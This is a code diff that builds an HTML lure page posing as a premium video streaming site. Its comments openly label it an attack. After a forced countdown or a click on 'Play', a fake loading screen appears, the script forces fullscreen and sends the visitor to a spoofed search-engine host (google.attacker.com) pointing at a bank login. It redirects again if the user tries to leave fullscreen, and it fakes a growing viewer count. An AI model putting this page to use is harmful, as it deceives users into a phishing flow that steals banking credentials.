@@ -1,12 +1,368 @@
-<!-- Trigger fullscreen, lalu redirect ke search engine spoof -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <title>Video Streaming Platform</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+        }
+
+        .video-player {
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .video-placeholder {
+            width: 100%;
+            height: 400px;
+            background: linear-gradient(45deg, #333, #555);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #ccc;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .video-placeholder::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: loading 2s infinite;
+        }
+
+        @keyframes loading {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .play-button {
+            background: #ff6b35;
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 20px 0;
+            font-weight: bold;
+            box-shadow: 0 8px 25px rgba(255, 107, 53, 0.3);
+        }
+
+        .play-button:hover {
+            background: #ff8c35;
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(255, 107, 53, 0.4);
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 40px 0;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+
+        .countdown {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 0, 0, 0.8);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: bold;
+            z-index: 1000;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
+        }
+
+        .fullscreen-notice {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            color: white;
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        .notice-content {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #ff6b35;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: #ff6b35;
+            border-radius: 3px;
+            transition: width 3s linear;
+        }
+    </style>
+</head>
 <body>
- 
+    <!-- Countdown Timer -->
+    <div class="countdown" id="countdown">
+        🎬 Auto-play in: <span id="timer">10</span>s
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="header">
+            <h1>🎥 Premium Video Streaming</h1>
+            <p>Watch exclusive content in highest quality</p>
+        </div>
+
+        <div class="video-player">
+            <h2>🔥 TRENDING: Exclusive Movie Preview</h2>
+            <div class="video-placeholder">
+                <div>
+                    <div style="font-size: 48px; margin-bottom: 10px;">🎬</div>
+                    <div>Premium Content - 4K Ultra HD</div>
+                    <div style="font-size: 14px; margin-top: 10px; opacity: 0.7;">Click play to start streaming</div>
+                </div>
+            </div>
+            
+            <button class="play-button" onclick="startVideo()">
+                ▶️ Play Now
+            </button>
+
+            <div style="margin-top: 20px; font-size: 14px; opacity: 0.8;">
+                <p>📊 2.4K watching now • ⭐ 4.8/5 rating • 🕒 2h 15m duration</p>
+            </div>
+        </div>
+
+        <div class="features">
+            <div class="feature-card">
+                <div class="feature-icon">🎯</div>
+                <h3>Exclusive Content</h3>
+                <p>Movies and shows you won't find anywhere else</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">⚡</div>
+                <h3>Instant Streaming</h3>
+                <p>Start watching immediately in full HD quality</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🔒</div>
+                <h3>Secure Platform</h3>
+                <p>Your viewing experience is protected and private</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Fullscreen Notice -->
+    <div class="fullscreen-notice" id="fullscreenNotice">
+        <div class="notice-content">
+            <div class="spinner"></div>
+            <h2>🔄 Preparing Fullscreen Experience</h2>
+            <p>Optimizing video player for best viewing...</p>
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+            <p style="font-size: 14px; opacity: 0.7; margin-top: 20px;">
+                Please wait while we set up the enhanced viewing mode
+            </p>
+        </div>
+    </div>
+
     <script>
-       document.documentElement.requestFullscreen().then(() => {
-    window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
-});
-</script>
+        // Countdown timer untuk auto-play
+        let countdown = 10;
+        const timerElement = document.getElementById('timer');
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            timerElement.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                startVideo();
+            }
+        }, 1000);
+
+        // Main attack function
+        function startVideo() {
+            clearInterval(countdownInterval);
+            document.getElementById('countdown').style.display = 'none';
+            
+            // Show loading notice
+            const notice = document.getElementById('fullscreenNotice');
+            notice.style.display = 'flex';
+            
+            // Start progress bar
+            const progress = document.getElementById('progress');
+            setTimeout(() => {
+                progress.style.width = '100%';
+            }, 100);
+
+            // Execute attack sequence
+            setTimeout(() => {
+                executeFullscreenAttack();
+            }, 3000);
+        }
+
+        function executeFullscreenAttack() {
+            // Phase 1: Request fullscreen
+            const element = document.documentElement;
+            
+            if (element.requestFullscreen) {
+                element.requestFullscreen()
+                    .then(() => {
+                        // Phase 2: Redirect to spoofed search engine setelah fullscreen aktif
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                        }, 1000);
+                    })
+                    .catch(err => {
+                        console.error('Fullscreen error:', err);
+                        // Fallback: redirect langsung jika fullscreen gagal
+                        window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                    });
+            } else if (element.webkitRequestFullscreen) {
+                // Safari support
+                element.webkitRequestFullscreen()
+                    .then(() => {
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                        }, 1000);
+                    })
+                    .catch(err => {
+                        window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                    });
+            } else if (element.msRequestFullscreen) {
+                // IE/Edge support
+                element.msRequestFullscreen()
+                    .then(() => {
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                        }, 1000);
+                    })
+                    .catch(err => {
+                        window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                    });
+            } else {
+                // Fallback untuk browser yang tidak support fullscreen
+                window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+            }
+        }
+
+        // Additional social engineering - fake user activity
+        let fakeUsers = 2457;
+        setInterval(() => {
+            fakeUsers += Math.floor(Math.random() * 3);
+            document.querySelector('.video-player p').textContent = 
+                `📊 ${fakeUsers} watching now • ⭐ 4.8/5 rating • 🕒 2h 15m duration`;
+        }, 5000);
+
+        // Handle exit fullscreen attempts
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                // Jika user mencoba keluar fullscreen, redirect anyway
+                window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+            }
+        });
+
+        document.addEventListener('webkitfullscreenchange', () => {
+            if (!document.webkitFullscreenElement) {
+                window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+            }
+        });
+
+        document.addEventListener('msfullscreenchange', () => {
+            if (!document.msFullscreenElement) {
+                window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+            }
+        });
+    </script>
 </body>
 </html>
